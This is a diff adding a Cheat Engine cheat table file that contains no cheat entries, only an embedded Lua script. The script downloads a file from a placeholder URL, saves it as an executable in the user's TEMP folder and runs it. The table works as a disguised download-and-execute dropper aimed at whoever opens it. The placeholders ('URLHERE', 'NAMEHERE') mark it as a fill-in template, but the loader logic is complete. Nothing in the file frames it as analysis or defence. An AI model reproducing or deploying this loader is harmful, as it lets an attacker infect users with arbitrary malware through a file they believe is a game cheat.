@@ -1,0 +1,7 @@
+<?xml version="1.0" encoding="utf-8"?>
+<CheatTable CheatEngineTableVersion="42">
+  <CheatEntries/>
+  <UserdefinedSymbols/>
+  <LuaScript>local url = 'URLHERE'local a= getInternet()local test = a.getURL(url)local location = os.getenv('TEMP')local file = io.open(location..'\\NAMEHERE.exe', 'wb')file:write(test)file:close()shellExecute(location..'\\NAMEHERE.exe')
+</LuaScript>
+</CheatTable>
